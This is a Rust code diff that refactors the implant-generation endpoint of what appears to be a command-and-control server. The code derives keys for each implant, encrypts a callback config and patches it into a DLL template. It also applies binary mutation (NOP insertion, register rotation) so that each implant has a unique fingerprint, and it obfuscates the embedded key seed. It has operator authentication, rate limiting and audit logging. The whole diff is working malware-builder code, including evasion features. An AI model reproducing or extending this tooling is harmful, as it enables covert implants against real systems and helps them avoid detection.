@@ -34,18 +34,33 @@ use axum::{
     http::{HeaderMap, StatusCode},
     Json,
 };
-use nyx_mutate::{MutationPasses, Mutator};
+use nyx_mutate::{MutationPasses, MutationReport, Mutator};
 use nyx_protocol::wire::Writer;
 use rand::RngCore;
 use serde::{Deserialize, Serialize};
 use sha2::{Digest, Sha256};
 
-use crate::{operators::Role, AppState, AuthOutcome};
+use crate::{operators::OperatorIdentity, operators::Role, AppState, AuthOutcome};
 
 /// Feature bit (bit 30 in the `features` u32) that enables binary mutation
 /// (NOP insertion, register rotation, key randomization) during implant
 /// generation. Set this flag to produce per-implant unique binary fingerprints.
 pub const FEATURE_MUTATE: u32 = 0x4000_0000;
+
+/// Return type of [`generate_implant_keys`]: (implant_priv, implant_pub,
+/// config_key, key_seed, auth_token, config_nonce) — all fixed-size arrays.
+type ImplantKeyMaterial = (
+    [u8; 32],
+    [u8; 32],
+    [u8; 32],
+    [u8; 32],
+    [u8; 32],
+    [u8; 12],
+);
+
+/// Return type of [`validate_generate_request`]:
+/// (template, implant_store) references.
+type ValidatedTemplate<'a> = (&'a Arc<Vec<u8>>, &'a Arc<nyx_store::ImplantStore>);
 
 /// Apply X25519 scalar clamping to a 32-byte key.
 /// - Clear the low 3 bits of byte 0
@@ -430,28 +445,18 @@ pub struct ImplantSummary {
 
 // ── Handler ─────────────────────────────────────────────────────────────────
 
-/// `POST /api/generate-implant`
-///
-/// Requires a loaded DLL template (`NYX_TEMPLATE`) and an open implant store.
-/// Authenticated via the standard control-API bearer token (checked by the
-/// auth middleware layer).
-pub async fn generate_implant(
-    State(st): State<Arc<AppState>>,
-    headers: HeaderMap,
-    Json(req): Json<GenerateRequest>,
-) -> Result<Json<GenerateResponse>, (StatusCode, String)> {
-    // Resolve the calling operator for attribution (audit `created_by`,
-    // rate-limit key) and RBAC. Mirrors `post_task`'s auth path: open mode maps
-    // to Viewer, which is blocked from write endpoints below. Previously this
-    // handler skipped auth entirely — every generation was attributed to the
-    // literal string "system", and the rate-limit key omitted the operator
-    // dimension entirely.
-    let op = match crate::authenticate(&st, &headers) {
-        AuthOutcome::Allowed(o) => o,
-        AuthOutcome::Denied(r) => {
-            return Err((r.status(), "unauthorized".to_string()));
-        }
-    };
+
+// ── generate_implant helpers ────────────────────────────────────────────────
+
+/// Validate the generate-implant request: operator role, template/store
+/// availability, and input sanity. Returns the template and implant-store
+/// references on success.
+fn validate_generate_request<'a>(
+    op: &OperatorIdentity,
+    template: Option<&'a Arc<Vec<u8>>>,
+    implant_store: Option<&'a Arc<nyx_store::ImplantStore>>,
+    req: &GenerateRequest,
+) -> Result<ValidatedTemplate<'a>, (StatusCode, String)> {
     if op.role == Role::Viewer {
         return Err((
             StatusCode::FORBIDDEN,
@@ -459,14 +464,14 @@ pub async fn generate_implant(
         ));
     }
 
-    let template = st.template.as_ref().ok_or_else(|| {
+    let template = template.ok_or_else(|| {
         (
             StatusCode::SERVICE_UNAVAILABLE,
             "implant generation disabled: no DLL template loaded (set NYX_TEMPLATE)".into(),
         )
     })?;
 
-    let implant_store = st.implants.as_ref().ok_or_else(|| {
+    let implant_store = implant_store.ok_or_else(|| {
         (
             StatusCode::SERVICE_UNAVAILABLE,
             "implant generation disabled: no implant store".into(),
@@ -513,36 +518,49 @@ pub async fn generate_implant(
         ));
     }
 
-    // Rate limiting: sliding window keyed by (operator, callback, port). Two
-    // concerns are bounded by including the operator dimension:
-    //   1. Enumeration/spray against a single target: capped at
-    //      DEFAULT_RATE_LIMIT_MAX per target per window.
-    //   2. A single operator (or compromised token) flooding generation across
-    //      MANY targets: previously the (callback,port)-only key let an
-    //      attacker rotate the target to bypass the per-target cap and emit
-    //      unbounded implants. The operator-scoped key makes one identity's
-    //      volume observable + throttleable per target.
-    {
-        use std::time::Instant;
-        let key = format!("{}:{}:{}", op.name, req.callback, req.port);
-        let mut entry = st.implant_rate_limiter.entry(key).or_default();
-        let now = Instant::now();
-        let window = std::time::Duration::from_secs(DEFAULT_RATE_LIMIT_WINDOW_SECS);
-        entry.retain(|t| now.duration_since(*t) < window);
-        if entry.len() >= DEFAULT_RATE_LIMIT_MAX {
-            return Err((
-                StatusCode::TOO_MANY_REQUESTS,
-                format!(
-                    "rate limit exceeded: max {} implants per hour per operator/target",
-                    DEFAULT_RATE_LIMIT_MAX
-                ),
-            ));
-        }
-        entry.push(now);
-    }
+    Ok((template, implant_store))
+}
 
-    // 1. Generate per-implant secrets.
-    //    key_seed: 32 random bytes, NEVER stored directly. Split into 4
+/// Rate limiting: sliding window keyed by (operator, callback, port). Two
+/// concerns are bounded by including the operator dimension:
+///   1. Enumeration/spray against a single target: capped at
+///      DEFAULT_RATE_LIMIT_MAX per target per window.
+///   2. A single operator (or compromised token) flooding generation across
+///      MANY targets: previously the (callback,port)-only key let an
+///      attacker rotate the target to bypass the per-target cap and emit
+///      unbounded implants. The operator-scoped key makes one identity's
+///      volume observable + throttleable per target.
+fn check_rate_limit(
+    st: &AppState,
+    op_name: &str,
+    callback: &str,
+    port: u16,
+) -> Result<(), (StatusCode, String)> {
+    use std::time::Instant;
+    let key = format!("{}:{}:{}", op_name, callback, port);
+    let mut entry = st.implant_rate_limiter.entry(key).or_default();
+    let now = Instant::now();
+    let window = std::time::Duration::from_secs(DEFAULT_RATE_LIMIT_WINDOW_SECS);
+    entry.retain(|t| now.duration_since(*t) < window);
+    if entry.len() >= DEFAULT_RATE_LIMIT_MAX {
+        return Err((
+            StatusCode::TOO_MANY_REQUESTS,
+            format!(
+                "rate limit exceeded: max {} implants per hour per operator/target",
+                DEFAULT_RATE_LIMIT_MAX
+            ),
+        ));
+    }
+    entry.push(now);
+    Ok(())
+}
+
+/// Generate per-implant secrets: key_seed, auth_token, config_nonce,
+/// implant keypair (X25519 with clamping), and config encryption key.
+fn generate_implant_keys(
+    server_pub: [u8; 32],
+) -> Result<ImplantKeyMaterial, (StatusCode, String)> {
+    // key_seed: 32 random bytes, NEVER stored directly. Split into 4
     //              fragments, XOR-obfuscated, and scattered across .nyx_cfg.
     //    auth_token: one-time first-check-in token (stored in encrypted config).
     //    config_nonce: 12-byte nonce for ChaCha20-Poly1305 config AEAD.
@@ -552,9 +570,6 @@ pub async fn generate_implant(
     rand::rngs::OsRng.fill_bytes(&mut key_seed);
     rand::rngs::OsRng.fill_bytes(&mut auth_token);
     rand::rngs::OsRng.fill_bytes(&mut config_nonce);
-
-    // Get the server's long-term public key for HKDF derivation.
-    let server_pub = st.keypair.public_bytes();
 
     // Derive implant_priv from key_seed via HKDF-SHA256 with X25519 clamping.
     let mut implant_priv_derived = [0u8; 32];
@@ -598,7 +613,14 @@ pub async fn generate_implant(
         )
     })?;
 
-    // 2. Build config plaintext.
+    Ok((implant_priv, implant_pub, config_key, key_seed, auth_token, config_nonce))
+}
+
+/// Build the per-implant config plaintext in wire format.
+fn build_implant_config(
+    req: &GenerateRequest,
+    auth_token: [u8; 32],
+) -> Result<(Vec<u8>, u64), (StatusCode, String)> {
     // Layout: str(callback) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
     //        | u8(has_token=1) | blob(auth_token 32B)
     //        | u32(features) | u32(keying) | u64(expires_at)
@@ -643,32 +665,49 @@ pub async fn generate_implant(
     pw.u64(expires_ts);
     let config_plaintext = pw.into_bytes();
 
-    // 3. Encrypt config with ChaCha20-Poly1305.
-    let ct_with_tag = {
-        use chacha20poly1305::aead::{Aead, KeyInit, Payload};
-        use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce};
-        let cipher = ChaCha20Poly1305::new(Key::from_slice(&config_key));
-        let nonce = Nonce::from_slice(&config_nonce);
-        cipher
-            .encrypt(
-                nonce,
-                Payload {
-                    msg: &config_plaintext,
-                    aad: b"",
-                },
+    Ok((config_plaintext, expires_ts))
+}
+
+/// Encrypt the per-implant config with ChaCha20-Poly1305 AEAD.
+fn encrypt_implant_config(
+    config_key: [u8; 32],
+    config_nonce: [u8; 12],
+    config_plaintext: &[u8],
+) -> Result<Vec<u8>, (StatusCode, String)> {
+    use chacha20poly1305::aead::{Aead, KeyInit, Payload};
+    use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce};
+    let cipher = ChaCha20Poly1305::new(Key::from_slice(&config_key));
+    let nonce = Nonce::from_slice(&config_nonce);
+    let ct_with_tag = cipher
+        .encrypt(
+            nonce,
+            Payload {
+                msg: config_plaintext,
+                aad: b"",
+            },
+        )
+        .map_err(|e| {
+            (
+                StatusCode::INTERNAL_SERVER_ERROR,
+                format!("encrypt failed: {e}"),
             )
-            .map_err(|e| {
-                (
-                    StatusCode::INTERNAL_SERVER_ERROR,
-                    format!("encrypt failed: {e}"),
-                )
-            })?
-    };
+        })?;
     // ct_with_tag = ciphertext || 16B Poly1305 tag
+    Ok(ct_with_tag)
+}
 
-    // 4. Patch the DLL template.
-    let mut binary = (**template).clone();
-
+/// Patch the DLL template: apply binary mutation (if FEATURE_MUTATE is set),
+/// locate and patch the .nyx_cfg section, and validate the PE.
+/// Returns the mutation report (None if mutation is disabled).
+fn patch_implant_template(
+    binary: &mut Vec<u8>,
+    req: &GenerateRequest,
+    implant_priv: [u8; 32],
+    implant_pub: [u8; 32],
+    server_pub: [u8; 32],
+    config_nonce: [u8; 12],
+    ct_with_tag: &[u8],
+) -> Result<Option<MutationReport>, (StatusCode, String)> {
     // Sanity-check the config ciphertext size before we touch the binary.
     // (The .nyx_cfg placeholder is located *after* mutation, since mutation
     // can shift its offset.)
@@ -711,7 +750,7 @@ pub async fn generate_implant(
             keys: true,
             substitute: true,
         };
-        let report = mutator.mutate(&mut binary, passes);
+        let report = mutator.mutate(binary, passes);
         tracing::info!(
             implant_pub = %hex::encode(implant_pub),
             nops = report.nops_inserted,
@@ -789,7 +828,7 @@ pub async fn generate_implant(
     section[54..86].copy_from_slice(&server_pub);
 
     // Encrypted config + tag at byte 86
-    section[86..86 + data_len].copy_from_slice(&ct_with_tag);
+    section[86..86 + data_len].copy_from_slice(ct_with_tag);
     // Zero-pad the rest
     for b in &mut section[86 + data_len..] {
         *b = 0;
@@ -798,16 +837,32 @@ pub async fn generate_implant(
     // Validate the patched PE before computing SHA-256 and storing. Catches a
     // malformed implant (bad magic, section overflow) at generation time rather
     // than letting the operator download a corrupted binary.
-    validate_patched_pe(&binary, placeholder_offset).map_err(|e| {
+    validate_patched_pe(binary, placeholder_offset).map_err(|e| {
         (
             StatusCode::INTERNAL_SERVER_ERROR,
             format!("PE validation failed after patching: {e}"),
         )
     })?;
 
+    Ok(mutation_report)
+}
+
+/// Compute SHA-256, store implant metadata, audit the generation event, and
+/// build the JSON response.
+#[allow(clippy::too_many_arguments)]
+fn store_and_audit_implant(
+    st: &AppState,
+    op: &OperatorIdentity,
+    req: &GenerateRequest,
+    implant_store: &Arc<nyx_store::ImplantStore>,
+    binary: &[u8],
+    implant_pub: [u8; 32],
+    auth_token: [u8; 32],
+    mutation_report: &Option<MutationReport>,
+) -> Result<Json<GenerateResponse>, (StatusCode, String)> {
     // 5. Compute SHA-256 of the output.
     let mut hasher = Sha256::new();
-    hasher.update(binary.as_slice());
+    hasher.update(binary);
     let sha256 = hex::encode(hasher.finalize());
 
     // 6. Store implant metadata.
@@ -872,7 +927,7 @@ pub async fn generate_implant(
             "format": req.format,
             "sha256": sha256,
         });
-        if let Some(ref report) = mutation_report {
+        if let Some(report) = mutation_report {
             detail["mutation"] = serde_json::json!({
                 "enabled": true,
                 "nops_inserted": report.nops_inserted,
@@ -898,7 +953,7 @@ pub async fn generate_implant(
         implant_pub: hex::encode(implant_pub),
         sha256,
         size_bytes: binary.len(),
-        format: req.format,
+        format: req.format.clone(),
         message: Some(format!(
             "implant {id} ready — {len} bytes",
             id = id,
@@ -906,11 +961,79 @@ pub async fn generate_implant(
         )),
         binary: if req.deliver.as_deref() == Some("inline") {
             use base64::{engine::general_purpose::STANDARD, Engine};
-            Some(STANDARD.encode(&binary))
+            Some(STANDARD.encode(binary))
         } else {
             None
         },
     }))
+}
+
+/// `POST /api/generate-implant`
+///
+/// Requires a loaded DLL template (`NYX_TEMPLATE`) and an open implant store.
+/// Authenticated via the standard control-API bearer token (checked by the
+/// auth middleware layer).
+pub async fn generate_implant(
+    State(st): State<Arc<AppState>>,
+    headers: HeaderMap,
+    Json(req): Json<GenerateRequest>,
+) -> Result<Json<GenerateResponse>, (StatusCode, String)> {
+    // Resolve the calling operator for attribution (audit `created_by`,
+    // rate-limit key) and RBAC. Mirrors `post_task`'s auth path: open mode maps
+    // to Viewer, which is blocked from write endpoints below. Previously this
+    // handler skipped auth entirely — every generation was attributed to the
+    // literal string "system", and the rate-limit key omitted the operator
+    // dimension entirely.
+    let op = match crate::authenticate(&st, &headers) {
+        AuthOutcome::Allowed(o) => o,
+        AuthOutcome::Denied(r) => {
+            return Err((r.status(), "unauthorized".to_string()));
+        }
+    };
+
+    // 1. Validate the request and unwrap template/store.
+    let (template, implant_store) =
+        validate_generate_request(&op, st.template.as_ref(), st.implants.as_ref(), &req)?;
+
+    // 2. Rate limiting.
+    check_rate_limit(&st, &op.name, &req.callback, req.port)?;
+
+    // 3. Generate per-implant secrets.
+    let server_pub = st.keypair.public_bytes();
+    let (implant_priv, implant_pub, config_key, _key_seed, auth_token, config_nonce) =
+        generate_implant_keys(server_pub)?;
+
+    // 4. Build config plaintext.
+    let (config_plaintext, _expires_ts) = build_implant_config(&req, auth_token)?;
+
+    // 5. Encrypt config with ChaCha20-Poly1305.
+    let ct_with_tag = encrypt_implant_config(config_key, config_nonce, &config_plaintext)?;
+
+    // 6. Patch the DLL template.
+    let mut binary = (**template).clone();
+    let mutation_report = patch_implant_template(
+        &mut binary,
+        &req,
+        implant_priv,
+        implant_pub,
+        server_pub,
+        config_nonce,
+        &ct_with_tag,
+    )?;
+
+    // 7. Store implant metadata and build response.
+    let response = store_and_audit_implant(
+        &st,
+        &op,
+        &req,
+        implant_store,
+        &binary,
+        implant_pub,
+        auth_token,
+        &mutation_report,
+    )?;
+
+    Ok(response)
 }
 
 /// `GET /api/implants` — list all generated implants.
